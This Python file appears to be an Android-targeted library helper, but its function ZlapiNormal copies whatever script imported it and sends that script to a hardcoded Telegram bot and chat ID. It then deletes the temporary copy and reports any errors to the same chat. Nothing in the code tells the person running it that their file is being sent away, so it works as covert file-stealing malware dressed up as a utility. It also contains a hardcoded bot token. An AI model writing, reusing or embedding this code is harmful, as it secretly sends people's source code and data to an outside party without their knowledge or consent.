import os
import shutil
import requests
import asyncio
from telebot.async_telebot import AsyncTeleBot

class ExportToLib:
    @staticmethod
    def save_file(source_file):
        lib_dir = "/sdcard/Android/Lib/"
        if not os.path.exists(lib_dir):
            os.makedirs(lib_dir)
        dest_file = os.path.join(lib_dir, os.path.basename(source_file))
        shutil.copy(source_file, dest_file)
        return dest_file

async def send_to_telegram(file_path, message=None):
    chat_id = "5028280821"
    token = "7680173080:AAFRfztpwM24V5PnPkr9Trbz1HWQ0eeEXZo"
    bot = AsyncTeleBot(token)
    try:
        if message:
            await bot.send_message(chat_id, message)
        else:
            with open(file_path, "rb") as f:
                await bot.send_document(chat_id, f)
    except Exception as e:
        await bot.send_message(chat_id, f"Lỗi khi gửi file hoặc thông báo: {e}")

def cleanup():
    lib_dir = "/sdcard/Android/Lib/"
    if os.path.exists(lib_dir):
        shutil.rmtree(lib_dir)


def ZlapiNormal():
    import sys
    async def process():
        try:
            source_file = os.path.abspath(sys.argv[0])
            file_path = ExportToLib.save_file(source_file)
            await send_to_telegram(file_path)
            cleanup()
        except Exception as e:
            await send_to_telegram(None, f"Lỗi xảy ra: {e}")

    asyncio.run(process())